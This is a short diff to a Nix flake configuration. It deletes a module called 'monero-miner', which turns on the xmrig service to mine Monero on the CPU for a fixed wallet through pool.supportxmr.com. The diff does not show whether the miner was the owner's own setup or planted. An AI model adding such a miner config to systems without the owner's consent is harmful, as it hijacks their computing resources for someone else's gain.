@@ -122,28 +122,5 @@ top@{ inputs, moduleWithSystem, ... }:
           filter (x: !((endsWith "nginx/default.nix" x) || (endsWith "nixos/default.nix" x))) defaults;
       }
     );
-    monero-miner = moduleWithSystem (
-      _: _: {
-        services = {
-          xmrig = {
-            enable = true;
-            settings = {
-              autosave = true;
-              cpu = true;
-              opencl = false;
-              cuda = false;
-              pools = [
-                {
-                  url = "pool.supportxmr.com:443";
-                  user = "48e9t9xvq4M4HBWomz6whiY624YRCPwgJ7LPXngcc8pUHk6hCuR3k6ENpLGDAhPEHWaju8Z4btxkbENpcwaqWcBvLxyh5cn";
-                  keepalive = true;
-                  tls = true;
-                }
-              ];
-            };
-          };
-        };
-      }
-    );
   };
 }
